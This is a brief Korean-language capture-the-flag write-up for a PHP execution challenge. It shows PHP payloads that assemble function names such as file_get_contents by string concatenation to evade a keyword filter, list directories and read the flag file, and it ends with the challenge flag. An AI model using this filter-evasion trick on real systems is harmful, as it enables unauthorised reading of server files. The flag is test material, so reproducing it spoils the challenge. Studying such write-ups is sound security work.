# Boxipreter (880p)

## Overview
php ssh.....? this is so vulnerable....

http://121.170.91.18/Boxipreter

## Solution
그저 PHP를 실행하게 하는 데 어떤 것들을 필터링 하는 것 같다, 'file' 같은 키워드들을.

그래서 그런 필터링을 피하기 위해서 함수를 문자열로 저장하고 그 문자열로 호출 하는 PHP Trick을 사용했다

```php
<?php
$f = 'op'.'en'.'d'.'ir';
$dh = $f('../');
$f='re'.'a'.'dd'.'ir';
echo $f($dh).'<br>';
echo $f($dh).'<br>';
echo $f($dh).'<br>';
echo $f($dh).'<br>';echo $f($dh).'<br>';echo $f($dh).'<br>';echo $f($dh).'<br>';
echo $f($dh);

/*
=== result ===
flag
.htaccess
tmp
..
index.html
.
index.php
*/
?>
```

```php
<?php
$f = 'fil'.'e_'.'get_'.'contents';
$fl = $f('../f'.'lag');
echo $fl;
?>
```

클리어~~

## flag
dimi{B0x1Pr3teR_1s_ver7_@wesome_!1!}